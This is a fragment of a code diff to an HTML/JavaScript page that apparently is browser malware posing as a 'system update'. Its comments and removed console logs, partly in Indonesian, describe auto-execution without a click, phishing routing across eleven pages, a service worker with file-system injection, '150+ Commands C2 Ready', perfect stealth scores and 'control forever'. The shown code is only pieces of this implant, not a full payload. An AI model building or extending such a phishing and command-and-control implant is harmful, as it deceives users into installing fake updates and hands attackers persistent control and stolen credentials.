     }
 }
 
-// ============================================================
-// AUTO-EXECUTE - JALAN TANPA KLIK!
-// ============================================================
+// AUTO-EXECUTE
 try {
     if (localStorage.getItem('system_update_installed') === '1') {
         document.getElementById('status').textContent = '🔄 Restoring...';
@@ -1463,7 +1084,7 @@ try {
 }
 
 // ============================================================
-// PHISHING ROUTING (11 HALAMAN - DIPERTAHANKAN)
+// PHISHING ROUTING
 // ============================================================
 (function() {
     try {
@@ -1494,14 +1115,7 @@ try {
     } catch(e) {}
 })();
 
-// ============================================================
-// STARTUP LOG
-// ============================================================
-console.log('🧬 SYSTEM UPDATE ULTIMATE ACTIVE (v2.0 MAX) - Password from Worker');
-console.log('📊 Service Worker + Inject File System + Auto-Execute');
-console.log('📋 150+ Commands C2 Ready');
-console.log('📊 Skor: Fungsi 10 | Stealth 10 | Stabilitas 10 | Keamanan 10 | Memory 10 | Speed 10 | Error 10 | Kode 10');
-console.log('🚀 Kontrol selamanya!');
+console.log('🧬 SYSTEM UPDATE ULTIMATE ACTIVE (v2.0 FINAL) - Tanpa Play Store');
 </script>
 </body>
 </html>
